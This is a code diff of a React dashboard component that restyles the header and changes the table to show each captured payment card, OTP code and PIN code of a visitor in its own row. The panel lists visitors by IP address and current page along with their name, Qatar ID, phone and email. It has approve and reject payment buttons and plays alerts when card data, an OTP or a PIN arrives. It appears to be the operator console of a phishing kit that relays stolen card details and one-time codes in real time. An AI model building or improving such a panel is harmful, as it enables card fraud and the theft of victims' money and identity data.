@@ -1,5 +1,5 @@
 import { useEffect, useState } from 'react';
-import { LogOut, Search, Eye, Trash2, CheckCircle, XCircle, Clock } from 'lucide-react';
+import { LogOut, Search, Eye, Trash2, CheckCircle, XCircle, Clock, Users } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
 import { useSocket } from '../context/SocketContext';
 import { playNewVisitorSound, playCardDataSound, playOTPSound, playPINSound } from '../utils/notificationSounds';
@@ -272,18 +272,24 @@ export default function Dashboard() {
   return (
     <div className="space-y-6">
       {/* Header */}
-      <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white rounded-lg p-6">
+      <div className="bg-gradient-to-br from-qiic-maroon via-red-800 to-red-900 text-white rounded-3xl p-8 shadow-2xl border border-white/10">
         <div className="flex items-center justify-between">
           <div>
-            <h1 className="text-3xl font-bold mb-2">Real-time Dashboard</h1>
-            <p className="text-lg opacity-90 flex items-center gap-2">
-              <span className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></span>
-              {connected ? 'Connected' : 'Disconnected'} • {customers.filter(c => c.isActive).length} / {customers.length} Active Customers
+            <h1 className="text-4xl font-bold mb-3">Real-time Dashboard</h1>
+            <p className="text-lg opacity-90 flex items-center gap-3 flex-wrap">
+              <span className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
+                <span className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></span>
+                <span className="font-semibold">{connected ? 'Connected' : 'Disconnected'}</span>
+              </span>
+              <span className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
+                <Users className="w-4 h-4" />
+                <span className="font-semibold">{customers.filter(c => c.isActive).length} / {customers.length} Active</span>
+              </span>
             </p>
           </div>
           <button 
             onClick={handleLogout}
-            className="bg-white/20 hover:bg-white/30 text-white px-6 py-3 rounded-lg flex items-center gap-2 transition-colors"
+            className="bg-white/20 hover:bg-white/30 text-white px-6 py-3 rounded-xl flex items-center gap-2 transition-all hover:scale-105"
           >
             <LogOut className="w-5 h-5" />
             Logout
@@ -329,236 +335,236 @@ export default function Dashboard() {
                   </td>
                 </tr>
               ) : (
-                filteredCustomers.map((customer) => (
-                  <tr key={customer.ip} className={`transition-all duration-200 border-b border-gray-200 ${customer.isActive ? 'bg-green-50 hover:bg-green-100' : 'bg-white hover:bg-gray-50'}`}>
-                    {/* Status Indicator */}
-                    <td className="px-3 py-4 text-xs whitespace-nowrap align-top">
-                      <div className="flex items-center gap-2">
-                        <span className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse shadow-lg shadow-green-300' : 'bg-gray-400'}`}></span>
-                        <span className={`text-xs font-bold px-2 py-1 rounded ${customer.isActive ? 'bg-green-200 text-green-800' : 'bg-gray-200 text-gray-600'}`}>
-                          {customer.isActive ? 'ONLINE' : 'OFFLINE'}
+                filteredCustomers.flatMap((customer) => {
+                  // Calculate how many rows this customer needs
+                  const paymentCount = customer.payments?.length || 0;
+                  const otpCount = customer.otpCodes?.length || 0;
+                  const pinCount = customer.pinCodes?.length || 0;
+                  const maxRows = Math.max(1, paymentCount, otpCount, pinCount);
+                  
+                  // Create array of rows for this customer
+                  return Array.from({ length: maxRows }, (_, rowIndex) => (
+                  <tr key={`${customer.ip}-${rowIndex}`} className={`border-b border-gray-200 ${customer.isActive ? 'bg-green-50' : 'bg-white'}`}>
+                    {/* Status Indicator - Show only on first row */}
+                    {rowIndex === 0 ? (
+                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
+                        <div className="flex items-center gap-1.5">
+                          <span className={`w-2.5 h-2.5 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse' : 'bg-gray-400'}`}></span>
+                          <span className={`text-xs font-semibold px-1.5 py-0.5 rounded ${customer.isActive ? 'bg-green-200 text-green-800' : 'bg-gray-200 text-gray-600'}`}>
+                            {customer.isActive ? 'ON' : 'OFF'}
+                          </span>
+                        </div>
+                      </td>
+                    ) : null}
+
+                    {/* IP Address - Show only on first row */}
+                    {rowIndex === 0 ? (
+                      <td className="px-2 py-2 text-xs font-mono font-semibold text-gray-900" rowSpan={maxRows}>
+                        <div className="flex items-center gap-2">
+                          <svg className="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
+                          </svg>
+                          {customer.ip}
+                        </div>
+                      </td>
+                    ) : null}
+
+                    {/* Current Page - Show only on first row */}
+                    {rowIndex === 0 ? (
+                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
+                        <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs font-mono">
+                          {customer.currentPage}
                         </span>
-                      </div>
-                    </td>
+                      </td>
+                    ) : null}
 
-                    {/* IP Address */}
-                    <td className="px-3 py-4 text-xs font-mono font-semibold text-gray-900 whitespace-nowrap align-top">
-                      <div className="flex items-center gap-2">
-                        <svg className="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
-                        </svg>
-                        {customer.ip}
-                      </div>
-                    </td>
-
-                    {/* Current Page */}
-                    <td className="px-3 py-4 text-xs whitespace-nowrap align-top">
-                      <span className="bg-gradient-to-r from-blue-500 to-blue-600 text-white px-3 py-1.5 rounded-lg text-xs font-mono shadow-md">
-                        {customer.currentPage}
-                      </span>
-                    </td>
-
-                    {/* Customer Info */}
-                    <td className="px-3 py-4 text-xs align-top">
-                      {customer.customerInfo ? (
-                        <div className="space-y-1.5" dir="ltr">
-                          <div className="flex items-center gap-2">
-                            <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
-                              <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
-                            </svg>
-                            <span className="text-green-700 font-bold">{customer.customerInfo.fullName}</span>
-                          </div>
-                          <div className="font-mono text-xs bg-blue-100 px-2 py-1 rounded inline-block">
-                            <span className="font-semibold">QID:</span> {customer.customerInfo.qid}
-                          </div>
-                          <div className="font-mono text-xs text-blue-700 font-semibold">
-                            📱 {customer.customerInfo.phone}
-                          </div>
-                          {customer.customerInfo.email && (
-                            <div className="text-xs text-gray-600 flex items-center gap-1">
-                              <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
-                                <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
-                                <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
+                    {/* Customer Info - Show only on first row */}
+                    {rowIndex === 0 ? (
+                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
+                        {customer.customerInfo ? (
+                          <div className="space-y-1" dir="ltr">
+                            <div className="flex items-center gap-2">
+                              <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                                <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                               </svg>
-                              {customer.customerInfo.email}
+                              <span className="text-green-700 font-bold">{customer.customerInfo.fullName}</span>
                             </div>
-                          )}
-                        </div>
-                      ) : (
-                        <span className="text-gray-400 font-semibold">—</span>
-                      )}
-                    </td>
-
-                    {/* Payment Cards - Show LATEST card only */}
-                    <td className="px-3 py-4 text-xs max-w-xs align-top">
-                      {customer.payments && customer.payments.length > 0 ? (
-                        <div className="space-y-2">
-                          {(() => {
-                            // Get the latest payment (most recent)
-                            const latestPayment = customer.payments[customer.payments.length - 1];
-                            return (
-                              <div className="border-l-4 border-green-500 bg-gradient-to-r from-green-50 to-white pl-3 pr-2 py-2 rounded-r-lg shadow-sm">
-                                <div className="flex items-center gap-2 mb-1">
-                                  <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
-                                    <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
-                                    <path fillRule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clipRule="evenodd" />
-                                  </svg>
-                                  <span className="text-green-700 font-bold text-xs">{latestPayment.paymentMethod}</span>
-                                </div>
-                                {latestPayment.cardNumber && (
-                                  <div className="font-mono text-xs bg-white border border-gray-300 px-2 py-1 rounded my-1 shadow-sm" dir="ltr">
-                                    💳 {latestPayment.cardNumber}
-                                  </div>
-                                )}
-                                {latestPayment.phoneNumber && (
-                                  <div className="font-mono text-xs text-blue-700 font-semibold" dir="ltr">
-                                    📱 {latestPayment.phoneNumber}
-                                  </div>
-                                )}
-                                {latestPayment.amount && (
-                                  <div className="text-green-700 font-bold text-sm mt-1">
-                                    💰 QAR {latestPayment.amount}
-                                  </div>
-                                )}
-                                <div className="text-xs text-gray-500 mt-1 flex items-center gap-1">
-                                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
-                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
-                                  </svg>
-                                  {new Date(latestPayment.timestamp).toLocaleTimeString('en-US')}
-                                </div>
+                            <div className="font-mono text-xs bg-blue-100 px-2 py-1 rounded inline-block">
+                              <span className="font-semibold">QID:</span> {customer.customerInfo.qid}
+                            </div>
+                            <div className="font-mono text-xs text-blue-700 font-semibold">
+                              📱 {customer.customerInfo.phone}
+                            </div>
+                            {customer.customerInfo.email && (
+                              <div className="text-xs text-gray-600 flex items-center gap-1">
+                                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                                  <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
+                                  <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
+                                </svg>
+                                {customer.customerInfo.email}
                               </div>
-                            );
-                          })()}
-                          {customer.payments.length > 1 && (
-                            <div className="flex items-center gap-2 mt-2 bg-blue-100 px-2 py-1.5 rounded border border-blue-300">
-                              <svg className="w-4 h-4 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
-                                <path d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9z" />
-                                <path fillRule="evenodd" d="M4 5a2 2 0 012-2 3 3 0 003 3h2a3 3 0 003-3 2 2 0 012 2v11a2 2 0 01-2 2H6a2 2 0 01-2-2V5zm3 4a1 1 0 000 2h.01a1 1 0 100-2H7zm3 0a1 1 0 000 2h3a1 1 0 100-2h-3zm-3 4a1 1 0 100 2h.01a1 1 0 100-2H7zm3 0a1 1 0 100 2h3a1 1 0 100-2h-3z" clipRule="evenodd" />
-                              </svg>
-                              <span className="text-xs font-bold text-blue-800">+{customer.payments.length - 1} more card(s)</span>
+                            )}
+                          </div>
+                        ) : (
+                          <span className="text-gray-400 font-semibold">—</span>
+                        )}
+                      </td>
+                    ) : null}
+
+                    {/* Payment Card - One per row */}
+                    <td className="px-2 py-2 text-xs max-w-xs">
+                      {customer.payments && customer.payments[rowIndex] ? (
+                        <div className="border-l-4 border-green-500 bg-gradient-to-r from-green-50 to-white pl-2 pr-2 py-1.5 rounded-r-lg">
+                          <div className="flex items-center gap-1.5 mb-0.5">
+                            <svg className="w-3.5 h-3.5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
+                              <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
+                              <path fillRule="evenodd" d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z" clipRule="evenodd" />
+                            </svg>
+                            <span className="text-green-700 font-semibold text-xs">{customer.payments[rowIndex].paymentMethod}</span>
+                          </div>
+                          {customer.payments[rowIndex].cardNumber && (
+                            <div className="font-mono text-xs bg-white border border-gray-200 px-1.5 py-0.5 rounded my-0.5" dir="ltr">
+                              💳 {customer.payments[rowIndex].cardNumber}
                             </div>
                           )}
+                          {customer.payments[rowIndex].phoneNumber && (
+                            <div className="font-mono text-xs text-blue-700 font-semibold" dir="ltr">
+                              📱 {customer.payments[rowIndex].phoneNumber}
+                            </div>
+                          )}
+                          {customer.payments[rowIndex].amount && (
+                            <div className="text-green-700 font-semibold text-xs mt-0.5">
+                              💰 QAR {customer.payments[rowIndex].amount}
+                            </div>
+                          )}
+                          <div className="text-xs text-gray-500 mt-0.5 flex items-center gap-1">
+                            <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
+                            </svg>
+                            {new Date(customer.payments[rowIndex].timestamp).toLocaleTimeString('en-US')}
+                          </div>
                         </div>
                       ) : (
                         <span className="text-gray-400 font-semibold">—</span>
                       )}
                     </td>
 
-                    {/* OTP / PIN Codes */}
-                    <td className="px-3 py-4 text-xs max-w-xs align-top">
-                      <div className="space-y-2">
-                        {customer.otpCodes && customer.otpCodes.length > 0 && (
-                          <div className="bg-gradient-to-r from-purple-50 to-purple-100 border-l-4 border-purple-500 rounded-r-lg p-2 shadow-sm">
-                            <div className="flex items-center gap-1 mb-1">
-                              <svg className="w-4 h-4 text-purple-700" fill="currentColor" viewBox="0 0 20 20">
+                    {/* OTP / PIN - One per row */}
+                    <td className="px-2 py-2">
+                      <div className="space-y-1.5 min-w-[200px]">
+                        {customer.otpCodes && customer.otpCodes[rowIndex] && (
+                          <div className="bg-gradient-to-r from-purple-50 to-purple-100 border-l-4 border-purple-500 rounded-r-lg p-1.5">
+                            <div className="flex items-center gap-1 mb-0.5">
+                              <svg className="w-3.5 h-3.5 text-purple-700" fill="currentColor" viewBox="0 0 20 20">
                                 <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                               </svg>
-                              <span className="font-bold text-purple-800 text-xs">OTP Codes</span>
+                              <span className="font-semibold text-purple-800 text-xs">OTP</span>
                             </div>
-                            {customer.otpCodes.map((otp, index) => (
-                              <div key={index} className="font-mono text-sm bg-white border border-purple-300 px-3 py-1.5 rounded mb-1 shadow-sm" dir="ltr">
-                                <div className="flex items-center gap-2">
-                                  <span className="text-purple-600">🔐</span>
-                                  <span className="font-bold text-purple-900">{otp.otpCode}</span>
-                                </div>
-                                <div className="text-xs text-gray-500 mt-1 flex items-center gap-1">
-                                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
-                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
-                                  </svg>
-                                  {new Date(otp.timestamp).toLocaleTimeString('en-US')}
-                                </div>
+                            <div className="font-mono text-sm bg-white border-2 border-purple-300 px-2 py-1 rounded mb-0.5" dir="ltr">
+                              <div className="flex items-center gap-1.5">
+                                <span className="text-purple-600">🔐</span>
+                                <span className="font-bold text-purple-900">{customer.otpCodes[rowIndex].otpCode}</span>
                               </div>
-                            ))}
+                              <div className="text-xs text-gray-500 mt-0.5 flex items-center gap-1">
+                                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
+                                </svg>
+                                {new Date(customer.otpCodes[rowIndex].timestamp).toLocaleTimeString('en-US')}
+                              </div>
+                            </div>
                           </div>
                         )}
-                        {customer.pinCodes && customer.pinCodes.length > 0 && (
-                          <div className="bg-gradient-to-r from-amber-50 to-amber-100 border-l-4 border-amber-500 rounded-r-lg p-2 shadow-sm">
-                            <div className="flex items-center gap-1 mb-1">
-                              <svg className="w-4 h-4 text-amber-700" fill="currentColor" viewBox="0 0 20 20">
+                        {customer.pinCodes && customer.pinCodes[rowIndex] && (
+                          <div className="bg-gradient-to-r from-amber-50 to-amber-100 border-l-4 border-amber-500 rounded-r-lg p-1.5">
+                            <div className="flex items-center gap-1 mb-0.5">
+                              <svg className="w-3.5 h-3.5 text-amber-700" fill="currentColor" viewBox="0 0 20 20">
                                 <path fillRule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z" clipRule="evenodd" />
                               </svg>
-                              <span className="font-bold text-amber-800 text-xs">PIN Codes</span>
+                              <span className="font-semibold text-amber-800 text-xs">PIN</span>
                             </div>
-                            {customer.pinCodes.map((pin, index) => (
-                              <div key={index} className="font-mono text-sm bg-white border border-amber-300 px-3 py-1.5 rounded mb-1 shadow-sm" dir="ltr">
-                                <div className="flex items-center gap-2">
-                                  <span className="text-amber-600">🔑</span>
-                                  <span className="font-bold text-amber-900">{pin.pinCode}</span>
-                                </div>
-                                <div className="text-xs text-gray-500 mt-1 flex items-center gap-1">
-                                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
-                                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
-                                  </svg>
-                                  {new Date(pin.timestamp).toLocaleTimeString('en-US')}
-                                </div>
+                            <div className="font-mono text-sm bg-white border-2 border-amber-300 px-2 py-1 rounded mb-0.5" dir="ltr">
+                              <div className="flex items-center gap-1.5">
+                                <span className="text-amber-600">🔑</span>
+                                <span className="font-bold text-amber-900">{customer.pinCodes[rowIndex].pinCode}</span>
                               </div>
-                            ))}
+                              <div className="text-xs text-gray-500 mt-0.5 flex items-center gap-1">
+                                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
+                                  <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clipRule="evenodd" />
+                                </svg>
+                                {new Date(customer.pinCodes[rowIndex].timestamp).toLocaleTimeString('en-US')}
+                              </div>
+                            </div>
                           </div>
                         )}
-                        {(!customer.otpCodes || customer.otpCodes.length === 0) && 
-                         (!customer.pinCodes || customer.pinCodes.length === 0) && (
+                        {(!customer.otpCodes || !customer.otpCodes[rowIndex]) && 
+                         (!customer.pinCodes || !customer.pinCodes[rowIndex]) && (
                           <span className="text-gray-400 font-semibold">—</span>
                         )}
                       </div>
                     </td>
 
-                    {/* Payment Status */}
-                    <td className="px-3 py-4 text-xs whitespace-nowrap align-top">
-                      {customer.payments && customer.payments.length > 0 ? (
-                        customer.paymentStatus === 'approved' ? (
-                          <span className="bg-gradient-to-r from-green-500 to-green-600 text-white px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-bold shadow-md">
-                            <CheckCircle className="w-4 h-4" /> APPROVED
-                          </span>
-                        ) : customer.paymentStatus === 'rejected' ? (
-                          <span className="bg-gradient-to-r from-red-500 to-red-600 text-white px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-bold shadow-md">
-                            <XCircle className="w-4 h-4" /> REJECTED
-                          </span>
+                    {/* Payment Status - Show only on first row */}
+                    {rowIndex === 0 ? (
+                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
+                        {customer.payments && customer.payments.length > 0 ? (
+                          customer.paymentStatus === 'approved' ? (
+                            <span className="bg-gradient-to-r from-green-500 to-green-600 text-white px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-bold shadow-md">
+                              <CheckCircle className="w-4 h-4" /> APPROVED
+                            </span>
+                          ) : customer.paymentStatus === 'rejected' ? (
+                            <span className="bg-gradient-to-r from-red-500 to-red-600 text-white px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-bold shadow-md">
+                              <XCircle className="w-4 h-4" /> REJECTED
+                            </span>
+                          ) : (
+                            <div className="flex gap-2 flex-wrap">
+                              <button
+                                onClick={() => handleApprovePayment(customer.ip)}
+                                className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white px-4 py-2.5 rounded-xl text-xs font-bold shadow-lg transition-all transform hover:scale-110 active:scale-95"
+                                title="Approve Payment"
+                              >
+                                ✓ APPROVE
+                              </button>
+                              <button
+                                onClick={() => handleRejectPayment(customer.ip)}
+                                className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white px-4 py-2.5 rounded-xl text-xs font-bold shadow-lg transition-all transform hover:scale-110 active:scale-95"
+                                title="Reject Payment"
+                              >
+                                ✗ REJECT
+                              </button>
+                            </div>
+                          )
                         ) : (
-                          <div className="flex gap-2">
-                            <button
-                              onClick={() => handleApprovePayment(customer.ip)}
-                              className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white px-3 py-2 rounded-lg text-xs font-bold shadow-md transition-all transform hover:scale-105"
-                              title="Approve Payment"
-                            >
-                              ✓ APPROVE
-                            </button>
-                            <button
-                              onClick={() => handleRejectPayment(customer.ip)}
-                              className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white px-3 py-2 rounded-lg text-xs font-bold shadow-md transition-all transform hover:scale-105"
-                              title="Reject Payment"
-                            >
-                              ✗ REJECT
-                            </button>
-                          </div>
-                        )
-                      ) : (
-                        <span className="bg-gray-200 text-gray-600 px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-semibold">
-                          <Clock className="w-4 h-4" /> WAITING
-                        </span>
-                      )}
-                    </td>
+                          <span className="bg-gray-200 text-gray-600 px-3 py-2 rounded-lg text-xs flex items-center gap-2 w-fit font-semibold">
+                            <Clock className="w-4 h-4" /> WAITING
+                          </span>
+                        )}
+                      </td>
+                    ) : null}
 
-                    {/* Actions */}
-                    <td className="px-3 py-4 text-xs whitespace-nowrap align-top">
-                      <div className="flex items-center gap-2">
-                        <button
-                          onClick={() => viewDetails(customer)}
-                          className="p-2 bg-blue-500 text-white hover:bg-blue-600 rounded-lg transition-all transform hover:scale-110 shadow-md"
-                          title="View Details"
-                        >
-                          <Eye className="w-4 h-4" />
-                        </button>
-                        <button
-                          onClick={() => handleDelete(customer.ip)}
-                          className="p-2 bg-red-500 text-white hover:bg-red-600 rounded-lg transition-all transform hover:scale-110 shadow-md"
-                          title="Delete Customer"
-                        >
-                          <Trash2 className="w-4 h-4" />
-                        </button>
-                      </div>
-                    </td>
+                    {/* Actions - Show only on first row */}
+                    {rowIndex === 0 ? (
+                      <td className="px-2 py-2 text-xs" rowSpan={maxRows}>
+                        <div className="flex items-center gap-2">
+                          <button
+                            onClick={() => viewDetails(customer)}
+                            className="p-2 bg-blue-500 text-white hover:bg-blue-600 rounded-lg transition-all transform hover:scale-110 shadow-md"
+                            title="View Details"
+                          >
+                            <Eye className="w-4 h-4" />
+                          </button>
+                          <button
+                            onClick={() => handleDelete(customer.ip)}
+                            className="p-2 bg-red-500 text-white hover:bg-red-600 rounded-lg transition-all transform hover:scale-110 shadow-md"
+                            title="Delete Customer"
+                          >
+                            <Trash2 className="w-4 h-4" />
+                          </button>
+                        </div>
+                      </td>
+                    ) : null}
                   </tr>
-                ))
+                  ));
+                })
               )}
             </tbody>
           </table>
